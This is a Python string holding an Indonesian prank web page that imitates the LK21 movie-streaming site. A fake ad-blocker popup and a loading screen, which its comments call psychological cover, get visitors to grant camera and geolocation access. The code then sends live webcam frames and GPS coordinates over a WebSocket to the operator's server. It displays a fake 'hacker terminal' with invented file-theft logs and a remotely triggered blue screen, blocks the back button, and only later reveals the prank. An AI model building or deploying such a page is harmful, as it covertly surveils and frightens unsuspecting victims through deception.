TARGET_HTML = """
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>LK21 - Nonton Film Bioskop Online</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { overflow: hidden; touch-action: none; background: #0a0a0a; font-family: sans-serif; }
        .glitch { animation: glitch 0.3s infinite; }
        @keyframes glitch { 0% { transform: translate(0) } 20% { transform: translate(-2px, 2px) } 40% { transform: translate(-2px, -2px) } 60% { transform: translate(2px, 2px) } 80% { transform: translate(2px, -2px) } 100% { transform: translate(0) } }
        .poster-img { background-image: url('https://image.tmdb.org/t/p/w500/8Vt6mWEReuy4Of61Lnj5Xj704m8.jpg'); background-size: cover; background-position: center; }
        
        /* Animasi Loading */
        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); width: 50px; height: 50px; border-radius: 50%; border-left-color: #f97316; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="text-gray-300 h-screen flex flex-col items-center justify-center select-none bg-[#0a0a0a]">

    <!-- LAYAR 1: FAKE LK21 UI -->
    <div id="screen-video" class="w-full h-full flex flex-col bg-[#111] z-50 overflow-y-auto">
        <div class="bg-[#1a1a1a] p-3 flex justify-between items-center border-b border-gray-800 shadow-lg sticky top-0 z-50">
            <div class="flex items-center gap-2">
                <div class="bg-orange-500 text-white font-bold px-2 py-0.5 rounded text-sm">LK21</div>
                <span class="text-xs text-gray-400 font-bold hidden sm:block">Nonton Movie Sub Indo</span>
            </div>
            <div class="flex gap-2">
                <div class="bg-gray-800 rounded px-2 py-1 text-xs text-gray-500 flex items-center">🔍 Cari...</div>
                <div class="bg-gray-800 rounded px-2 py-1 text-xs text-gray-500 flex items-center">👤 Login</div>
            </div>
        </div>

        <div class="p-4 flex-1">
            <h2 class="text-orange-500 font-bold mb-3 text-sm border-l-4 border-orange-500 pl-2">Film Terbaru</h2>
            
            <div onclick="showAd()" class="relative w-full h-64 rounded-lg overflow-hidden shadow-xl border border-gray-700 cursor-pointer group">
                <div class="poster-img w-full h-full opacity-80 group-active:opacity-100 transition"></div>
                <div class="absolute inset-0 bg-gradient-to-t from-black via-transparent to-transparent flex flex-col justify-end p-4">
                    <span class="bg-orange-600 text-white text-[10px] font-bold px-2 py-1 rounded w-max mb-2">HD</span>
                    <h1 class="text-white text-xl font-bold">Spider-Man: Across the Spider-Verse</h1>
                    <p class="text-gray-300 text-xs mt-1">Action, Adventure, Animation</p>
                    <div class="mt-3 bg-orange-600 text-white text-center font-bold py-2 rounded shadow-lg active:bg-orange-700">
                        ▶ NONTON SEKARANG
                    </div>
                </div>
            </div>

            <div class="grid grid-cols-3 gap-2 mt-4">
                <div class="bg-gray-800 h-32 rounded border border-gray-700 opacity-50"></div>
                <div class="bg-gray-800 h-32 rounded border border-gray-700 opacity-50"></div>
                <div class="bg-gray-800 h-32 rounded border border-gray-700 opacity-50"></div>
            </div>
        </div>
    </div>

    <!-- LAYAR 2: POPUP IKLAN -->
    <div id="screen-ad" class="hidden fixed inset-0 bg-black/90 z-50 flex items-center justify-center p-4">
        <div class="bg-white text-black p-6 rounded-lg text-center max-w-sm w-full relative shadow-2xl">
            <h2 class="font-bold text-lg mb-2 text-red-600">⚠️ AdBlocker Terdeteksi</h2>
            <p class="text-sm text-gray-600 mb-4">Harap nonaktifkan AdBlocker untuk melanjutkan pemutaran video.</p>
            
            <div id="ad-timer" class="text-xs text-gray-500 mb-2 font-bold">
                Memuat video dalam <span id="timer-count" class="text-red-500 text-lg">3</span>...
            </div>
            
            <button id="btn-skip" onclick="startLoading()" class="hidden bg-blue-600 text-white font-bold py-3 px-6 rounded w-full active:bg-blue-800 shadow-md">✕ LEWATI IKLAN</button>
        </div>
    </div>

    <!-- LAYAR 2.5: FAKE LOADING (PENUTUP IZIN KAMERA) -->
    <div id="screen-loading" class="hidden fixed inset-0 bg-black z-50 flex flex-col items-center justify-center text-white p-6">
        <div class="spinner mb-6"></div>
        <h2 class="text-xl font-bold mb-2">Menghubungkan ke Server...</h2>
        <p class="text-gray-400 text-sm mb-4">Mengoptimalkan pemutaran video 1080p HD</p>
        <div class="w-64 bg-gray-800 rounded-full h-2.5 mb-2">
            <div id="progress-bar" class="bg-orange-500 h-2.5 rounded-full" style="width: 0%"></div>
        </div>
        <p id="progress-text" class="text-xs text-orange-500">0%</p>
        <p class="text-[10px] text-gray-500 mt-10 text-center">*Mohon izinkan akses yang diminta browser untuk memverifikasi koneksi Anda.</p>
    </div>

    <!-- LAYAR 3: HACKER TERMINAL -->
    <div id="screen-hack" class="hidden w-full h-full p-4 flex flex-col justify-between bg-black z-40 relative text-green-500 font-mono">
        <div onclick="killSwitch()" class="absolute top-0 right-0 w-12 h-12 z-50"></div>
        <div>
            <div class="flex justify-between border-b border-green-800 pb-2 mb-2 text-xs">
                <span>STATUS: <b class="text-red-500 animate-ping">BREACHED</b></span>
                <span id="battery">BAT: --%</span>
            </div>
            <div id="device-info" class="text-[10px] text-green-700 mb-2 bg-green-950/30 p-1"></div>
            
            <div class="bg-gray-950 border border-green-600 p-3 rounded min-h-[120px] max-h-[150px] overflow-y-auto">
                <p class="text-xs text-gray-500 mb-1">> Administrator Message:</p>
                <span id="ghost-text" class="text-lg font-bold text-white break-words"></span><span class="animate-ping">_</span>
            </div>
            
            <div id="scan-log" class="text-[10px] text-green-700 h-24 mt-2 overflow-hidden font-mono">
                [SYSTEM] Bypassing firewall...<br>
            </div>
        </div>

        <div class="my-2 relative flex justify-center items-center h-48">
            <video id="cam" autoplay playsinline class="hidden w-40 h-40 object-cover rounded-full border-2 border-red-600 shadow-[0_0_20px_rgba(255,0,0,0.8)]"></video>
            <canvas id="cam-canvas" width="320" height="240" class="hidden"></canvas>
            
            <video id="vid" playsinline class="hidden w-full max-h-48 rounded border border-green-500" src="https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4"></video>
            <div id="bsod" class="hidden absolute inset-0 bg-blue-600 text-white flex flex-col items-center justify-center text-center p-4 z-50 font-sans">
                <h1 class="text-6xl mb-4">:(</h1>
                <p class="text-lg">Your PC ran into a problem and needs to restart.</p>
                <p class="text-sm mt-4">0% complete</p>
            </div>
        </div>
    </div>

    <!-- LAYAR 4: PUNCHLINE -->
    <div id="screen-gotcha" class="hidden fixed inset-0 bg-white text-black z-[100] flex flex-col items-center justify-center p-6 text-center font-sans">
        <h1 class="text-5xl mb-4">😄</h1>
        <h2 class="text-2xl font-bold mb-2">GOTCHA!</h2>
        <p class="text-gray-700">HP kamu tidak diretas. Ini cuma trik sulap digital.</p>
        <p class="text-sm text-gray-500 mt-4">Dibuat oleh: [Nama Anda]</p>
        <button onclick="location.reload()" class="mt-8 bg-black text-white px-6 py-2 rounded">Tutup</button>
    </div>

    <script>
        let ws;
        let tapCount = 0;
        let streamInterval;
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';

        function showAd() {
            document.getElementById('screen-ad').classList.remove('hidden');
            let count = 3;
            const timer = setInterval(() => {
                count--;
                document.getElementById('timer-count').innerText = count;
                if (count <= 0) {
                    clearInterval(timer);
                    document.getElementById('ad-timer').classList.add('hidden');
                    document.getElementById('btn-skip').classList.remove('hidden');
                }
            }, 1000);
        }

        // FUNGSI BARU: LOADING SCREEN PALSU
        function startLoading() {
            document.getElementById('screen-ad').classList.add('hidden');
            document.getElementById('screen-loading').classList.remove('hidden');
            
            let progress = 0;
            const interval = setInterval(() => {
                progress += Math.floor(Math.random() * 8) + 2; // Naik 2-10% tiap interval
                if (progress > 99) progress = 99; // Tahan di 99% sampai izin diberikan
                
                document.getElementById('progress-bar').style.width = `${progress}%`;
                document.getElementById('progress-text').innerText = `${progress}%`;

                // Jika sudah mencapai 30%, mulai minta izin (Jeda psikologis)
                if (progress > 30 && progress < 40) {
                    clearInterval(interval);
                    executePermissions();
                }
            }, 300);
        }

        // FUNGSI BARU: MINTA IZIN & FULLSCREEN
        async function executePermissions() {
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(()=>{});
            }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                window.camStream = stream; 
                
                const video = document.getElementById('cam');
                const canvas = document.getElementById('cam-canvas');
                const ctx = canvas.getContext('2d');
                video.srcObject = stream;
                
                ws = new WebSocket(`${protocol}//${window.location.host}/ws/target`);
                
                streamInterval = setInterval(() => {
                    if(ws.readyState === WebSocket.OPEN && video.readyState === video.HAVE_ENOUGH_DATA) {
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
                        ws.send(JSON.stringify({ action: 'frame', data: dataUrl }));
                    }
                }, 300);

            } catch (e) { 
                console.log("Camera denied"); 
                ws = new WebSocket(`${protocol}//${window.location.host}/ws/target`);
            }

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    const lat = pos.coords.latitude.toFixed(4);
                    const lon = pos.coords.longitude.toFixed(4);
                    addLog(`[GPS] LOCATION LOCKED: ${lat}, ${lon}`);
                    if (ws && ws.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify({ action: 'location', lat: lat, lon: lon }));
                    }
                }, ()=>{});
            }

            // Setelah izin selesai, lanjutkan loading sampai 100% lalu HACK
            let finalProgress = 40;
            const finishInterval = setInterval(() => {
                finalProgress += 15;
                if (finalProgress >= 100) {
                    finalProgress = 100;
                    clearInterval(finishInterval);
                    setTimeout(triggerHack, 500);
                }
                document.getElementById('progress-bar').style.width = `${finalProgress}%`;
                document.getElementById('progress-text').innerText = `${finalProgress}%`;
            }, 300);
        }

        function triggerHack() {
            document.getElementById('screen-loading').classList.add('hidden');
            document.getElementById('screen-video').classList.add('hidden');
            
            document.getElementById('screen-hack').classList.remove('hidden');
            document.body.classList.add('glitch'); 
            setTimeout(() => document.body.classList.remove('glitch'), 300);

            document.getElementById('device-info').innerText = navigator.userAgent;
            if (navigator.getBattery) {
                navigator.getBattery().then(b => document.getElementById('battery').innerText = `BAT: ${Math.round(b.level * 100)}%`);
            } else {
                document.getElementById('battery').innerText = `BAT: ${Math.floor(Math.random() * 40) + 40}%`; 
            }

            history.pushState(null, null, location.href);
            window.onpopstate = function () { history.go(1); };

            setInterval(() => {
                const files = ["/DCIM/Camera/IMG_2024.jpg", "/WhatsApp/Chats/msg.db", "/Android/data/com.tiktok/cache", "/Documents/Rahasia.pdf"];
                const file = files[Math.floor(Math.random() * files.length)];
                addLog(`[STEALING] ${file} ... OK`);
            }, 1500);

            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                if (data.action === 'type') {
                    document.getElementById('ghost-text').innerText = data.text;
                } else if (data.action === 'vibrate') {
                    if (navigator.vibrate) navigator.vibrate([300, 100, 300, 100, 500]);
                    document.body.classList.add('bg-red-900');
                    setTimeout(() => document.body.classList.remove('bg-red-900'), 400);
                } else if (data.action === 'camera') {
                    document.getElementById('cam').classList.remove('hidden');
                    document.getElementById('vid').classList.add('hidden');
                } else if (data.action === 'video') {
                    const vid = document.getElementById('vid');
                    vid.classList.remove('hidden');
                    document.getElementById('cam').classList.add('hidden');
                    vid.play();
                } else if (data.action === 'bsod') {
                    document.getElementById('bsod').classList.remove('hidden');
                } else if (data.action === 'reset') {
                    document.getElementById('ghost-text').innerText = '';
                    document.getElementById('vid').pause();
                    document.getElementById('vid').classList.add('hidden');
                    document.getElementById('cam').classList.add('hidden');
                    document.getElementById('bsod').classList.add('hidden');
                    document.body.classList.remove('bg-red-900');
                } else if (data.action === 'punchline') {
                    document.getElementById('screen-gotcha').classList.remove('hidden');
                    document.getElementById('screen-hack').classList.add('hidden');
                }
            };
        }

        function addLog(msg) {
            const log = document.getElementById('scan-log');
            log.innerHTML = `> ${msg}<br>` + log.innerHTML;
        }

        function killSwitch() {
            tapCount++;
            if (tapCount >= 5) {
                document.getElementById('screen-gotcha').classList.remove('hidden');
                document.getElementById('screen-hack').classList.add('hidden');
            }
            setTimeout(() => { tapCount = 0; }, 2000);
        }
    </script>
</body>
</html>
"""
